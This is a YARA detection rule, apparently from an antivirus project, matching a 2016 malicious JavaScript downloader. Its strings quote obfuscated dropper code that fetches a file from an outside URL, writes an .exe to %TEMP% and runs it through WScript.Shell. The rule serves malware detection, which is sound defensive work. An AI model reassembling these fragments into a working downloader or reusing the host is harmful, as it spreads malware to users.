rule sig_20160328_230aad170e000697f38f8c3ff254a494 {
  meta:
    description = "datamaliciousorder - file 20160328_230aad170e000697f38f8c3ff254a494.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ef172fa35d142dc784a422b00772f4e5cfebfac5a681c22accdabd8d486b9af0"

  strings:
    $s1  = "function Nhztszaegy() {return Qrrytxn[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"DFttc8tAmYvlqI.exe\";};" fullword ascii
    $s2  = "var Qrrytxn = function Vbnkiw() {return WScript[Rpsqtxw](\"WScript.Shell\");}();" fullword ascii
    $s3  = "Jjarz[Fnavdlbo](\"GET\", \"http://www.cloudfire.pt/l3iska\", false);" fullword ascii
    $s4  = "function Fhomgcn(Ffkclpql, Klqvocztkz){return Ffkclpql - Klqvocztkz;};" fullword ascii
    $s5  = "do {WScript[Icarj](Nmtuzrmav() * 11)} while (Jjarz[\"readystate\"] < 4 );" fullword ascii
    $s6  = "function Xxqdsv() {return ((Fcgdcnzwkd == true) && (Fcgdcnzwkd == Gzbtep)) ? 1 : Xxyciqgtg;};" fullword ascii
    $s7  = "function Lmjigal(Alzpvj){Qrrytxn[\"Run\"](Alzpvj, Xxyciqgtg, Xxyciqgtg);};" fullword ascii
    $s8  = " while (Okcyy){" fullword ascii
    $s9  = "Gzbtep = true; " fullword ascii
    $s10 = "function Nmtuzrmav(){return 22;};" fullword ascii
    $s11 = "var Gzbtep = false;" fullword ascii
    $s12 = "return Fhomgcn(Tmlghtiinr, Ctgcxxwu);" fullword ascii
    $s13 = "Fcgdcnzwkd = true; " fullword ascii
    $s14 = "function Eyhrdsgece(){return Dibukw;};" fullword ascii
    $s15 = "function Hxkkzg()" fullword ascii
    $s16 = "var Fodhl = false;" fullword ascii
    $s17 = "var Xqnyp = new this[\"Date\"]();" fullword ascii
    $s18 = "function Kacfgtblv(Onaqzxz) {var Kfyey = (1, 2, 3, 4, 5, Onaqzxz); return Kfyey;};" fullword ascii
    $s19 = "function Okmfntopj(){return Rpsqtxw;};" fullword ascii
    $s20 = "var Fcgdcnzwkd = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}